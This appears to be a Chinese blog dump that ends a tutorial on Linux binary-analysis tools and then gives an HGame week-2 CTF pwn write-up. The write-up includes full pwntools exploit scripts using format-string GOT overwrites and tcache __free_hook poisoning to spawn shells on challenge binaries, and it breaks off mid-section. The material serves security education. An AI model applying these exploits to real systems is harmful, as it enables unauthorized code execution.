在链接时，多个公共符号可能会出现相同的名称。 如果该符号在任何地方被定义，公共符号会被当作未定义的引用。当符号位于小公文的特殊部分时，小写的c字符被使用。 D 见下 d 符号在初始化数据部分。 G 见下 g 符号在小对象的初始化数据部分。一些对象文件格式允许更有效地访问小的数据对象，例如一个全局int变量，而不是一个大的全局数组。 i 对于PE格式的文件，这表示该符号在一个特定的DLLs实现部分。对于ELF格式文件，这表示该符号是一个间接函数。 这是一个GNU对符号类型的GNU扩展。 它表示一个符号，如果被重定位引用，不会评估到其地址，而是必须在运行时调用。 运行时的执行将返回用于重定位的值在重定位中使用的值。注意 - GNU间接符号的实际符号显示由 \u0026ndash;ifunc-chars 命令行选项控制。如果提供了这个选项，那么字符串中的第一个字符将被用于全局间接函数符号。 如果字符串中包含第二个字符，那么它将被用于本地间接函数符号。 I 符号是对另一个符号的间接引用。 N 该符号是一个调试符号。 n 符号在只读数据部分。 p 该符号在堆栈解压部分。 R 见下 r 符号在只读数据部分。 S 见下 s 符号在未初始化或零初始化的小对象的数据段中。 T 见下 t 符号在文本（代码）部分。 U 符号是未定义的。 u 该符号是一个唯一的全局符号。 这是一个GNU对ELF符号绑定标准集的扩展。 对于符号，动态链接器将确保在整个过程中，只有一个具有此名称和类型的符号在使用。和类型的符号在使用。 V 见下 v 符号是一个弱对象。 当一个弱定义的符号与一个正常定义的符号连接时，正常定义的符号被使用，没有任何错误。 当一个弱的未定义的符号被链接并且该符号未被定义时，弱的符号的值会变成零，并且没有错误。符号的值变成了零，没有任何错误。 在某些系统中，大写字母表示默认值已被指定。 W 见下 w 该符号是一个弱符号，没有被特别标记为弱对象符号。 当一个弱定义的符号与正常定义的符号相连接时，正常定义的符号被使用，没有任何错误。 当一个弱的符号被链接，并且该符号没有被定义，那么该符号的值将以系统特定的方式确定，而不会出现错误。符号的值以系统特定的方式确定，没有错误。 在某些系统上，大写字母表示已经指定了一个默认值。 - 符号是a.out对象文件中的stabs符号。 在这种情况下，接下来打印的值是stabs other字段，stabs desc字段，以及stab类型。 stabs符号是用来保存调试信息的。 ? 符号类型未知，或对象文件格式特定。 我们也可以用nm -D login只打印出动态链接的符号：\n我们也可以向使用file一样使用通配符批量解析文件\n更多选项见nm --help或man nm\nc++filt 这个命令可以协同nm命令使用。因为C++中有模板、重载等，因为要唯一标志一个同名函数，所以编译出来的函数名会非常奇怪，难以阅读\n我们可以使用c++filt来重命名这些函数\n注意，C++filt的重命名有可能因程序使用的编译器不同而失败，也可能丢失一些信息\nnm login | c++filt 我们可以看到，这时候函数名就类似于编写C++程序时使用的函数名了\n我们还可以更改这个呈现函数的形式：\nnm login | c++filt -s java ldd 这个命令很常用，是用来查看动态链接程序所使用的动态库的：\n可以加上-v来查看更多信息\nldd命令可以在我们对一个程序使用patchelf命令更换动态库的时候提供向导\nobjdump 使用线性反汇编对程序进行静态分析\n我们可以查看程序的头部（起到和file命令类似的作用）：\n查看file header的总览：\n查看file header的简化版本：\n显示特定对象格式的文件头内容：\n也可以单独查看节头：\n可以直接查看所有header：\n可以查看程序的调试信息：\n可以不加分析地查看所有节头的二进制信息：\n可以只查看可执行节的反汇编结果：\n这样的文本文件叫做反汇编死代码清单（dead listing），尽管这些文件可用于实施逆向工程，但它们很难有效导航，也无法以一致且无错的方式被修改。\n但是它的反汇编结果是AT\u0026amp;T风格的，我们可以更换为Intel风格：\n还有更多用法可以查看objdump --help或man objdump\nstrings strings可以搜索至少包含 4 个连续可打印 ASCII 字符的字符串，并将结果在控制台打印出来（程序虽然包含这样的字符串，但是并不代表程序会使用），有一些字符串是程序实际使用的，有一些是程序的函数名等\n我们可以只打印.data节中的字符串：\n我们可以指定包含多少个连续可打印字符的字符串会被输出：\nreadelf readelf与objdump大体相同，主要区别在于 readelf 并不依赖 libbfd\nreadelf -S 查询节头表 -l 查询程序头表 -s 查询符号表 -e 查询ELF文件头数据 -r 查询重定位入口 -d 查询动态段 对ELF的具体解读请阅读我写的ELF详解\nndisasm ndisasm是Netwide Assembler（NASM）提供的流式反汇编器\n我们选择架构为64位intel指令集，并将反汇编结果输入到一个文件中：\n由于流式反汇编非常灵活，因此它的用途相当广泛。例如，在分析网络数据包中可能包含shellcode 的计算机网络攻击时，就可以采用流式反汇编器来反汇编数据包中包含 shellcode 的部分，以分析恶意负载的行为。另外一种情况是分析那些不包含布局参考的 ROM 镜像。ROM 中有些部分是数据，其他部分则为代码，可以使用流式反汇编器来反汇编镜像中的代码\nobjcopy objcopy用于将object的部分获全部内容拷贝到另一个object，这里的object通常是可执行文件\n我们可以将调试信息分离：\n可以剥离调试信息：\n注意，这里只是剥离了调试信息，并不代表符号表被剥离了：\n可以将调试信息加回去：\n更多阅读：\nobjcopy的使用_crystony的博客-CSDN博客_objcopy 获取某个section Linux 命令（69）—— objcopy 命令_恋喵大鲤鱼的博客-CSDN博客_objcopy GNU Objcopy语法和使用_StudyTaoo的博客-CSDN博客_objcopy strip 我们在做ctf题目的过程中，常常会有一些善良的出题者将符号表删除，导致ida解析出来的函数列表没有名字，极其难懂\n那么，我们要如何做到这一点呢？答案是使用strip命令：\nstrip \u0026lt;程序名\u0026gt; 然后就只剩下.dynsym了：\n这样也不影响程序运行，达到了给程序瘦身的目的，只是不利于反编译🤭\nsize 用于列出目标文件或库文件的section大小\n","date":"2023年01月22日","permalink":"https://peterliuzhi.top/tricks/linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/","section":"tricks","summary":"Action is the foundational key to all success. — Pablo Picasso 💡如需使用本文中介绍的大部分命令，请确保系统安装了binutils，如未安装，请使用如下命令安装：sudo apt-get install binutils file 我们对一个文件","tags":["re","pwn","tools"],"title":"Linux中常用的分析文件的小工具"},{"categories":["writeup","HGame"],"contents":" I\u0026rsquo;d rather attempt to do something great and fail than to attempt to do nothing and succeed. — Robert Schuller\n上期见这里\nYukkuriSay checksec查看程序架构 发现了canary，但是这题溢出不到canary，那么可能可以利用canary其他的漏洞，比如更改__stack_check_fail的got值\nida查看伪C代码 函数主体是一个不断向一个没有溢出漏洞的栈空间写入内容（这个内容被用%s打印出来，没有格式化字符串漏洞），然后是一个非栈上格式化字符串漏洞\n法一：利用栈上保存的setbuffer函数地址泄露libc后更改__stack_check_fail的got值 我们可以利用%s的特点把这个setbuffer+204打印出来，然后就泄露得到了栈地址\n然后我们再用同样的方法得到栈地址\n因为我们第一次写入的内容保存在栈上，所以最后我们可以利用格式化字符串漏洞实现任意地址写，更改__stack_check_fail的got值为one_gadget后，再更改canary触发__stack_check_fail\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./HGame-week2-YukkuriSay\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31110\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)].ljust(8, b\u0026#34;\\x00\u0026#34;)) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... p = None def pwn(): global p if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x4016A4 c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 11111111 # %8$s payload = flat([ b\u0026#34;a\u0026#34;*(0xe0), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) base_addr = recv_and_transform(b\u0026#34;b\u0026#34;*8) - libc.sym[\u0026#39;setbuffer\u0026#39;] - 204 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[1] suclog( base_addr=base_addr, one_gadget=one_gadget, system_addr=system_addr ) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ b\u0026#34;a\u0026#34;*(0xf8), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) stack_addr = recv_and_transform(b\u0026#34;b\u0026#34;*6) - 0x18 suclog(stack_addr=stack_addr) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;], m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;] + 2, m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;] + 4, stack_addr ]) sendline_after_clean(payload) sendline_after_clean(\u0026#34;n\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) write1 = one_gadget \u0026amp; 0xffff write2 = ((one_gadget \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff) write3 = ((one_gadget \u0026gt;\u0026gt; (4*8)) \u0026amp; 0xffff) which_write = {write1:8, write2:9, write3:10} all_write = [write1, write2, write3] all_write.sort() payload = \u0026#34;\u0026#34; tmp = 0 for to_write in all_write: payload += f\u0026#34;%{to_write-tmp}c%{which_write[to_write]}$hn\u0026#34; tmp = to_write payload += f\u0026#34;%11$hhn\u0026#34; # %43$n # payload = f\u0026#34;%{write2}c%8$hn%{write1-write2}c%9$hn%{write3-write1}c%10$hn\u0026#34; sendline_after_clean(payload, \u0026#34;a gift for you: \\n\u0026#34;) pwn() interactive_after_clean() 法二：获取栈地址后更改返回地址和printf的got值 我们既然可以更改任意地址的值，同时获得了栈地址，那么我们可以先更改printf的got值为system，再更改返回值，然后返回到主函数某一个位置，printf出/bin/sh，就可以getshell了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-YukkuriSay\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31110\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)].ljust(8, b\u0026#34;\\x00\u0026#34;)) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... p = None def pwn(): global p if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x4016A4 c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 11111111 # %8$s payload = flat([ b\u0026#34;a\u0026#34;*(0xe0), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) base_addr = recv_and_transform(b\u0026#34;b\u0026#34;*8) - libc.sym[\u0026#39;setbuffer\u0026#39;] - 204 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[1] suclog( base_addr=base_addr, one_gadget=one_gadget, system_addr=system_addr ) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ b\u0026#34;a\u0026#34;*(0xf8), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) stack_addr = recv_and_transform(b\u0026#34;b\u0026#34;*6) - 0x8 suclog(stack_addr=stack_addr) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ m_elf.got[\u0026#39;printf\u0026#39;], m_elf.got[\u0026#39;printf\u0026#39;] + 2, m_elf.got[\u0026#39;printf\u0026#39;] + 4, stack_addr, stack_addr + 2 ]) sendline_after_clean(payload) sendline_after_clean(\u0026#34;n\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) return_addr = 0x401671 write1 = system_addr \u0026amp; 0xffff write2 = ((system_addr \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff) write3 = ((system_addr \u0026gt;\u0026gt; (4*8)) \u0026amp; 0xffff) ret1 = return_addr \u0026amp; 0xffff ret2 = (return_addr \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff which_write = {write1:8, write2:9, write3:10, ret1: 11, ret2:12} all_write = [write1, write2, write3, ret1, ret2] all_write.sort() payload = \u0026#34;\u0026#34; tmp = 0 for to_write in all_write: payload += f\u0026#34;%{to_write-tmp}c%{which_write[to_write]}$hn\u0026#34; tmp = to_write # %43$n # payload = f\u0026#34;%{write2}c%8$hn%{write1-write2}c%9$hn%{write3-write1}c%10$hn\u0026#34; sendline_after_clean(payload, \u0026#34;a gift for you: \\n\u0026#34;) sendline_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34;) pwn() interactive_after_clean() editable_note checksec查看程序架构 ida查看伪C代码 这道题不走寻常路，使用内联汇编实现了一个堆菜单题，最终还是通过数字选择这三个功能：\n大致思路就是先填满tcache bin（7个）后分配到unsorted bin中泄露main_arena，然后将tcache分配到__free_hook上覆盖更改为system\n小贴士 在更改tcache中chunk的next位时，一定要确保分配完__free_hook上的chunk后，tcache-\u0026gt;counts要大于1\n比如：\n像这种情况，0x20的tcache bin就不会再申请__free_hook的chunk了，而是转而去分割unsorted bin中的chunk\n原因是每一个不同大小的tcache，它都独立维护一个counts域，而在malloc的时候会检查这个域，只有当它大于等于0的时候才会执行tcache_get：\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-editable_note\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30248\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) sendline_after_clean(str(size)) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;4\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) sendline_after_clean(content, \u0026#34;Content: \u0026#34;) main_arena_offset = 0x1ECB80 allocate(0, 0x10) allocate(1, 0x80) allocate(2, 0x80) allocate(3, 0x80) allocate(4, 0x80) allocate(5, 0x80) allocate(6, 0x80) allocate(7, 0x80) allocate(8, 0x80) allocate(9, 0x10) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) remove(8) # gdb.attach(p) remove(1) show(1) # gdb.attach(p) base_addr = recv_and_transform() - main_arena_offset - 96 one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[2] hook_addr = base_addr + libc.sym[\u0026#39;__free_hook\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;one_gadget\u0026#34;, \u0026#34;hook_addr\u0026#34;, \u0026#34;system_addr\u0026#34; ) # remove(8) payload = pg(hook_addr)*2 change(8, payload) # gdb.attach(p) allocate(10, 0x80) allocate(11, 0x80) # gdb.attach(p) payload = flat([ system_addr ]) change(11, payload) change(10, b\u0026#34;/bin/sh\\x00\u0026#34;) remove(10) interactive_after_clean() fast_note checksec查看程序架构 ida查看伪C代码 这道题没有edit函数，同时free后指针没有置零，而且还是一道glibc2.23的题目\n那么思路就很清楚了：unsorted 